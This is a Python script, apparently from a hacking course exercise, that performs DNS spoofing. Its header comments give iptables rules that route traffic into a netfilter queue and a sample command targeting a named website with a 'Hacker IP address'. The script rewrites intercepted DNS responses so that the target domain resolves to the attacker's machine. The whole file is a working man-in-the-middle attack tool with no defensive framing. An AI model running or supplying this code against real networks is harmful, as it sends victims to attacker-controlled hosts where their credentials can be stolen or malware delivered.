# iptables -A INPUT -p udp  --sport 53 -j NFQUEUE --queue-num 1
# iptables -I FORWARD -j NFQUEUE --queue-num 1
# python 05-dns_spoof/dns_spoofer.py -w www.marca.com -i 192.168.0.35

import netfilterqueue
import scapy.all as scapy
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-w", "--website", dest="website",
                        help="Website url")
    parser.add_argument("-i", "--ip-address", dest="ip",
                        help="Hacker IP address")
    options = parser.parse_args()
    return options


def spoof_packet(packet):
    options = get_arguments()
    dns_packet = scapy.IP(packet.get_payload())
    if dns_packet.haslayer(scapy.DNSRR):
        qname = dns_packet[scapy.DNSQR].qname
        if options.website in qname.decode("utf-8"):
            dns_responce = scapy.DNSRR(rrname=qname, rdata=options.ip)
            dns_packet[scapy.DNS].an = dns_responce
            dns_packet[scapy.DNS].ancount = 1

            del dns_packet[scapy.IP].len
            del dns_packet[scapy.IP].chksum
            del dns_packet[scapy.UDP].len
            del dns_packet[scapy.UDP].chksum

            # packet.set_payload(str(dns_packet))
            packet.set_payload(bytes(dns_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(1, spoof_packet)
queue.run()